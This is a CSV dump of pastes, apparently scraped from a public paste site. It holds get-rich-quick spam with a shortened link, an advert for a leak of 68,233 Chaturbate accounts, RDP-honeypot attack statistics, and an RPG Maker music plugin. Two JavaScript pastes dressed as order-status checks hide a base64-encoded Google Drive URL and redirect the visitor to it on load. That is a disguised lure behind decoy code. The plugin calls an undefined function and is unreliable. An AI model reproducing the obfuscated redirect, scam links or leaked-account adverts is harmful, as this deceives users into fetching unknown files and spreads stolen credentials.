id,title,username,language,date,content
WCLbrj6i,EARN $900 INSTANTLY 2025⭐ NU,sde235gud,JavaScript,Saturday 26th of April 2025 07:21:07 PM CDT," 
Pdf https://tinyurl.com/privguidee

BwdYw3jA5b
"
nxD38nu5,Products.js,Epiphemeral,JavaScript,Saturday 26th of April 2025 07:19:09 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/14121/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
f7A5dF3i,2025-04-26_stats.json,rdp_snitch,JSON,Saturday 26th of April 2025 07:18:31 PM CDT,"{
  ""ip"": {
    ""211.185.207.14"": 21,
    ""71.82.170.60"": 21,
    ""92.255.57.11"": 6,
    ""80.94.95.198"": 72,
    ""157.245.104.150"": 3,
    ""194.165.16.166"": 6,
    ""198.235.24.242"": 9,
    ""88.214.25.124"": 6,
    ""193.176.22.13"": 12,
    ""161.97.77.37"": 9261,
    ""62.60.188.24"": 6,
    ""198.235.24.226"": 9,
    ""197.210.194.240"": 6,
    ""88.214.50.50"": 18,
    ""80.94.95.90"": 3,
    ""193.46.255.73"": 6,
    ""45.156.130.30"": 18,
    ""205.210.31.196"": 9,
    ""212.132.93.159"": 3,
    ""78.142.18.92"": 3,
    ""91.238.181.91"": 6,
    ""138.68.11.85"": 621,
    ""194.165.16.165"": 6,
    ""221.181.44.30"": 3,
    ""147.185.132.213"": 9
  },
  ""asn"": {
    ""AS4766"": 21,
    ""AS20115"": 21,
    ""AS207566"": 6,
    ""AS204428"": 75,
    ""AS14061"": 624,
    ""AS48721"": 12,
    ""AS396982"": 36,
    ""AS35042"": 6,
    ""Unknown"": 30,
    ""AS51167"": 9261,
    ""AS215930"": 6,
    ""AS29465"": 6,
    ""AS47890"": 6,
    ""AS211680"": 18,
    ""AS8560"": 3,
    ""AS208046"": 3,
    ""AS49434"": 6,
    ""AS9808"": 3
  },
  ""isp"": {
    ""Korea Telecom"": 21,
    ""Charter Communications"": 21,
    ""Chang Way Technologies Co. Limited"": 6,
    ""SS-Net"": 75,
    ""DigitalOcean, LLC"": 624,
    ""Flyservers S.A."": 12,
    ""Google LLC"": 36,
    ""NOC EMAIL: noc@one-host.net"": 6,
    ""SIA \""Singularity Telecom\"""": 30,
    ""Contabo GmbH"": 9261,
    ""Cipher Operations DOO Beograd - Novi Beograd"": 6,
    ""MTN NIGERIA Communication limited"": 6,
    ""Unmanaged LTD"": 6,
    ""NSEC - Sistemas Informaticos, S.A."": 18,
    ""IONOS SE fra.de"": 3,
    ""ColocationX Ltd."": 3,
    ""Datacenter location PAR1 France"": 6,
    ""China Mobile communications corporation"": 3
  },
  ""org"": {
    ""Kornet"": 21,
    ""Spectrum"": 21,
    ""Chang Way Technologies Co. Limited"": 6,
    ""Unmanaged LTD"": 81,
    ""DigitalOcean, LLC"": 624,
    ""Flyservers S.A"": 12,
    ""Palo Alto Networks, Inc"": 36,
    ""ThinkTech Technology Industrial CO. Limited"": 12,
    ""SIA \""Singularity Telecom\"""": 30,
    ""Contabo GmbH"": 9261,
    ""UAB Host Baltic"": 6,
    ""MTN Nigeria"": 6,
    ""Inap PHX"": 18,
    ""IONOS SE"": 3,
    ""ColocationX Ltd"": 3,
    ""China Mobile"": 3
  },
  ""regionName"": {
    ""Sejong-si"": 21,
    ""Wisconsin"": 21,
    ""Moscow"": 6,
    ""Budapest"": 75,
    ""Karnataka"": 3,
    ""Kaunas"": 12,
    ""California"": 657,
    ""Kowloon City"": 6,
    ""New York"": 30,
    ""Grand Est"": 9261,
    ""Tehran"": 6,
    ""Lagos"": 6,
    ""England"": 6,
    ""Arizona"": 18,
    ""Hesse"": 3,
    ""North Holland"": 3,
    ""\u00cele-de-France"": 6,
    ""Guangdong"": 3
  },
  ""country"": {
    ""South Korea"": 21,
    ""United States"": 726,
    ""Russia"": 6,
    ""Hungary"": 75,
    ""India"": 3,
    ""Lithuania"": 12,
    ""Hong Kong"": 6,
    ""France"": 9267,
    ""Iran"": 6,
    ""Nigeria"": 6,
    ""United Kingdom"": 6,
    ""Germany"": 3,
    ""The Netherlands"": 3,
    ""China"": 3
  },
  ""account"": {
    ""142.93.8.59"": 114,
    ""Administr"": 9,
    ""hello"": 9903,
    ""Test"": 39,
    ""QzYDCEsFC"": 3,
    ""oGwANx"": 3,
    ""gOFKOm"": 3,
    ""arTIIqSxy"": 3,
    ""JAtgeK"": 3,
    ""lEtRRi"": 3,
    ""Domain"": 18,
    ""(empty)"": 6,
    ""root"": 18,
    ""ZmFhvWaZj"": 3,
    ""jHTvpr"": 3,
    ""uJUFEf"": 3,
    ""ErfffyqAt"": 3,
    ""JLbWwv"": 3,
    ""ehNftc"": 3
  },
  ""keyboard"": {
    ""Unknown"": 10143
  },
  ""client_build"": {
    ""Unknown"": 10143
  },
  ""client_name"": {
    ""Unknown"": 10143
  },
  ""ip_type"": {
    ""Unknown"": 198,
    ""proxy"": 6,
    ""hosting & proxy"": 624,
    ""hosting"": 9306,
    ""mobile & hosting"": 6,
    ""mobile"": 3
  }
}"
igWG87YJ,2025-04-26_stats.json,rdp_snitch,JSON,Saturday 26th of April 2025 07:16:17 PM CDT,"{
  ""ip"": {
    ""211.185.207.14"": 14,
    ""71.82.170.60"": 14,
    ""92.255.57.11"": 4,
    ""80.94.95.198"": 48,
    ""157.245.104.150"": 2,
    ""194.165.16.166"": 4,
    ""198.235.24.242"": 6,
    ""88.214.25.124"": 4,
    ""193.176.22.13"": 8,
    ""161.97.77.37"": 6174,
    ""62.60.188.24"": 4,
    ""198.235.24.226"": 6,
    ""197.210.194.240"": 4,
    ""88.214.50.50"": 12,
    ""80.94.95.90"": 2,
    ""193.46.255.73"": 4,
    ""45.156.130.30"": 12,
    ""205.210.31.196"": 6,
    ""212.132.93.159"": 2,
    ""78.142.18.92"": 2,
    ""91.238.181.91"": 4,
    ""138.68.11.85"": 414,
    ""194.165.16.165"": 4,
    ""221.181.44.30"": 2,
    ""147.185.132.213"": 6
  },
  ""asn"": {
    ""AS4766"": 14,
    ""AS20115"": 14,
    ""AS207566"": 4,
    ""AS204428"": 50,
    ""AS14061"": 416,
    ""AS48721"": 8,
    ""AS396982"": 24,
    ""AS35042"": 4,
    ""Unknown"": 20,
    ""AS51167"": 6174,
    ""AS215930"": 4,
    ""AS29465"": 4,
    ""AS47890"": 4,
    ""AS211680"": 12,
    ""AS8560"": 2,
    ""AS208046"": 2,
    ""AS49434"": 4,
    ""AS9808"": 2
  },
  ""isp"": {
    ""Korea Telecom"": 14,
    ""Charter Communications"": 14,
    ""Chang Way Technologies Co. Limited"": 4,
    ""SS-Net"": 50,
    ""DigitalOcean, LLC"": 416,
    ""Flyservers S.A."": 8,
    ""Google LLC"": 24,
    ""NOC EMAIL: noc@one-host.net"": 4,
    ""SIA \""Singularity Telecom\"""": 20,
    ""Contabo GmbH"": 6174,
    ""Cipher Operations DOO Beograd - Novi Beograd"": 4,
    ""MTN NIGERIA Communication limited"": 4,
    ""Unmanaged LTD"": 4,
    ""NSEC - Sistemas Informaticos, S.A."": 12,
    ""IONOS SE fra.de"": 2,
    ""ColocationX Ltd."": 2,
    ""Datacenter location PAR1 France"": 4,
    ""China Mobile communications corporation"": 2
  },
  ""org"": {
    ""Kornet"": 14,
    ""Spectrum"": 14,
    ""Chang Way Technologies Co. Limited"": 4,
    ""Unmanaged LTD"": 54,
    ""DigitalOcean, LLC"": 416,
    ""Flyservers S.A"": 8,
    ""Palo Alto Networks, Inc"": 24,
    ""ThinkTech Technology Industrial CO. Limited"": 8,
    ""SIA \""Singularity Telecom\"""": 20,
    ""Contabo GmbH"": 6174,
    ""UAB Host Baltic"": 4,
    ""MTN Nigeria"": 4,
    ""Inap PHX"": 12,
    ""IONOS SE"": 2,
    ""ColocationX Ltd"": 2,
    ""China Mobile"": 2
  },
  ""regionName"": {
    ""Sejong-si"": 14,
    ""Wisconsin"": 14,
    ""Moscow"": 4,
    ""Budapest"": 50,
    ""Karnataka"": 2,
    ""Kaunas"": 8,
    ""California"": 438,
    ""Kowloon City"": 4,
    ""New York"": 20,
    ""Grand Est"": 6174,
    ""Tehran"": 4,
    ""Lagos"": 4,
    ""England"": 4,
    ""Arizona"": 12,
    ""Hesse"": 2,
    ""North Holland"": 2,
    ""\u00cele-de-France"": 4,
    ""Guangdong"": 2
  },
  ""country"": {
    ""South Korea"": 14,
    ""United States"": 484,
    ""Russia"": 4,
    ""Hungary"": 50,
    ""India"": 2,
    ""Lithuania"": 8,
    ""Hong Kong"": 4,
    ""France"": 6178,
    ""Iran"": 4,
    ""Nigeria"": 4,
    ""United Kingdom"": 4,
    ""Germany"": 2,
    ""The Netherlands"": 2,
    ""China"": 2
  },
  ""account"": {
    ""142.93.8.59"": 76,
    ""Administr"": 6,
    ""hello"": 6602,
    ""Test"": 26,
    ""QzYDCEsFC"": 2,
    ""oGwANx"": 2,
    ""gOFKOm"": 2,
    ""arTIIqSxy"": 2,
    ""JAtgeK"": 2,
    ""lEtRRi"": 2,
    ""Domain"": 12,
    ""(empty)"": 4,
    ""root"": 12,
    ""ZmFhvWaZj"": 2,
    ""jHTvpr"": 2,
    ""uJUFEf"": 2,
    ""ErfffyqAt"": 2,
    ""JLbWwv"": 2,
    ""ehNftc"": 2
  },
  ""keyboard"": {
    ""Unknown"": 6762
  },
  ""client_build"": {
    ""Unknown"": 6762
  },
  ""client_name"": {
    ""Unknown"": 6762
  },
  ""ip_type"": {
    ""Unknown"": 132,
    ""proxy"": 4,
    ""hosting & proxy"": 416,
    ""hosting"": 6204,
    ""mobile & hosting"": 4,
    ""mobile"": 2
  }
}"
jLzEdz8k,2025-04-26_stats.json,rdp_snitch,JSON,Saturday 26th of April 2025 07:15:08 PM CDT,"{
  ""ip"": {
    ""211.185.207.14"": 7,
    ""71.82.170.60"": 7,
    ""92.255.57.11"": 2,
    ""80.94.95.198"": 24,
    ""157.245.104.150"": 1,
    ""194.165.16.166"": 2,
    ""198.235.24.242"": 3,
    ""88.214.25.124"": 2,
    ""193.176.22.13"": 4,
    ""161.97.77.37"": 3087,
    ""62.60.188.24"": 2,
    ""198.235.24.226"": 3,
    ""197.210.194.240"": 2,
    ""88.214.50.50"": 6,
    ""80.94.95.90"": 1,
    ""193.46.255.73"": 2,
    ""45.156.130.30"": 6,
    ""205.210.31.196"": 3,
    ""212.132.93.159"": 1,
    ""78.142.18.92"": 1,
    ""91.238.181.91"": 2,
    ""138.68.11.85"": 207,
    ""194.165.16.165"": 2,
    ""221.181.44.30"": 1,
    ""147.185.132.213"": 3
  },
  ""asn"": {
    ""AS4766"": 7,
    ""AS20115"": 7,
    ""AS207566"": 2,
    ""AS204428"": 25,
    ""AS14061"": 208,
    ""AS48721"": 4,
    ""AS396982"": 12,
    ""AS35042"": 2,
    ""Unknown"": 10,
    ""AS51167"": 3087,
    ""AS215930"": 2,
    ""AS29465"": 2,
    ""AS47890"": 2,
    ""AS211680"": 6,
    ""AS8560"": 1,
    ""AS208046"": 1,
    ""AS49434"": 2,
    ""AS9808"": 1
  },
  ""isp"": {
    ""Korea Telecom"": 7,
    ""Charter Communications"": 7,
    ""Chang Way Technologies Co. Limited"": 2,
    ""SS-Net"": 25,
    ""DigitalOcean, LLC"": 208,
    ""Flyservers S.A."": 4,
    ""Google LLC"": 12,
    ""NOC EMAIL: noc@one-host.net"": 2,
    ""SIA \""Singularity Telecom\"""": 10,
    ""Contabo GmbH"": 3087,
    ""Cipher Operations DOO Beograd - Novi Beograd"": 2,
    ""MTN NIGERIA Communication limited"": 2,
    ""Unmanaged LTD"": 2,
    ""NSEC - Sistemas Informaticos, S.A."": 6,
    ""IONOS SE fra.de"": 1,
    ""ColocationX Ltd."": 1,
    ""Datacenter location PAR1 France"": 2,
    ""China Mobile communications corporation"": 1
  },
  ""org"": {
    ""Kornet"": 7,
    ""Spectrum"": 7,
    ""Chang Way Technologies Co. Limited"": 2,
    ""Unmanaged LTD"": 27,
    ""DigitalOcean, LLC"": 208,
    ""Flyservers S.A"": 4,
    ""Palo Alto Networks, Inc"": 12,
    ""ThinkTech Technology Industrial CO. Limited"": 4,
    ""SIA \""Singularity Telecom\"""": 10,
    ""Contabo GmbH"": 3087,
    ""UAB Host Baltic"": 2,
    ""MTN Nigeria"": 2,
    ""Inap PHX"": 6,
    ""IONOS SE"": 1,
    ""ColocationX Ltd"": 1,
    ""China Mobile"": 1
  },
  ""regionName"": {
    ""Sejong-si"": 7,
    ""Wisconsin"": 7,
    ""Moscow"": 2,
    ""Budapest"": 25,
    ""Karnataka"": 1,
    ""Kaunas"": 4,
    ""California"": 219,
    ""Kowloon City"": 2,
    ""New York"": 10,
    ""Grand Est"": 3087,
    ""Tehran"": 2,
    ""Lagos"": 2,
    ""England"": 2,
    ""Arizona"": 6,
    ""Hesse"": 1,
    ""North Holland"": 1,
    ""\u00cele-de-France"": 2,
    ""Guangdong"": 1
  },
  ""country"": {
    ""South Korea"": 7,
    ""United States"": 242,
    ""Russia"": 2,
    ""Hungary"": 25,
    ""India"": 1,
    ""Lithuania"": 4,
    ""Hong Kong"": 2,
    ""France"": 3089,
    ""Iran"": 2,
    ""Nigeria"": 2,
    ""United Kingdom"": 2,
    ""Germany"": 1,
    ""The Netherlands"": 1,
    ""China"": 1
  },
  ""account"": {
    ""142.93.8.59"": 38,
    ""Administr"": 3,
    ""hello"": 3301,
    ""Test"": 13,
    ""QzYDCEsFC"": 1,
    ""oGwANx"": 1,
    ""gOFKOm"": 1,
    ""arTIIqSxy"": 1,
    ""JAtgeK"": 1,
    ""lEtRRi"": 1,
    ""Domain"": 6,
    ""(empty)"": 2,
    ""root"": 6,
    ""ZmFhvWaZj"": 1,
    ""jHTvpr"": 1,
    ""uJUFEf"": 1,
    ""ErfffyqAt"": 1,
    ""JLbWwv"": 1,
    ""ehNftc"": 1
  },
  ""keyboard"": {
    ""Unknown"": 3381
  },
  ""client_build"": {
    ""Unknown"": 3381
  },
  ""client_name"": {
    ""Unknown"": 3381
  },
  ""ip_type"": {
    ""Unknown"": 66,
    ""proxy"": 2,
    ""hosting & proxy"": 208,
    ""hosting"": 3102,
    ""mobile & hosting"": 2,
    ""mobile"": 1
  }
}"
BB9nrWEd,Chaturbate with Tokens,kammex,JavaScript,Saturday 26th of April 2025 07:12:04 PM CDT,68233 Accounts Posted On https://t.me/leakedbyem1nem
tGH0Qtmk,Make $1000 15-MINUTES  (BEGINNER) ME,sde235gud,JavaScript,Saturday 26th of April 2025 07:11:51 PM CDT," 
Pdf https://tinyurl.com/privguidee

qEOmMGvpGw
"
Zead944Q,Order.js,Epiphemeral,JavaScript,Saturday 26th of April 2025 07:03:47 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/66688/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
UjyL9Wzp,EARN $900 INSTANTLY 2025 M6,sde235gud,JavaScript,Saturday 26th of April 2025 07:02:32 PM CDT," 
Pdf https://tinyurl.com/privguidee

O6ivwxR4o4
"
NvF5cVJX,MalCustomGameOverME,Maliki79,JavaScript,Saturday 26th of April 2025 07:01:56 PM CDT,"//=============================================================================
// Maliki's Custom Game Ove ME 
// MalCustomGameOverME.js
// version 1.0
//=============================================================================
/*:  
* @plugindesc ver1.0 - Allows devs to set custom Music to GameOver Scene.  
 *@author Maliki79
 *
 * @help Use the below Script calls to change music from the default one chosen in the database.
 *
 * SCRIPT CALLS
 *
 * $gameSystem.setCustomGOME(name);
 * This call will enter the file in the game's ME folder to be used at the game over screen.
 * (Remember to use ""quotes"" and DO NOT use the file's extension) 
 * If you leave the name blank, the ME will return to the default ME.
 */
 
var MalGOMEInitialize = Game_System.prototype.initialize;
Game_System.prototype.initialize = function() {
MalEncounterInitialize.call(this);
this._customGOME = """";
}

Game_System.prototype.setCustomGOME = function(name) {
if (name) {
	this._customGOME = name;
	} else {
	this._customGOME = """";
};
};	

Scene_Gameover.prototype.playGameoverMusic = function() {
    AudioManager.stopBgm();
    AudioManager.stopBgs();
	var name = $gameSystem._customGOME;
	var sound = $dataSystem.gameoverMe;
	if (name !== """") sound.name = name;
    AudioManager.playMe($dataSystem.gameoverMe);
};"
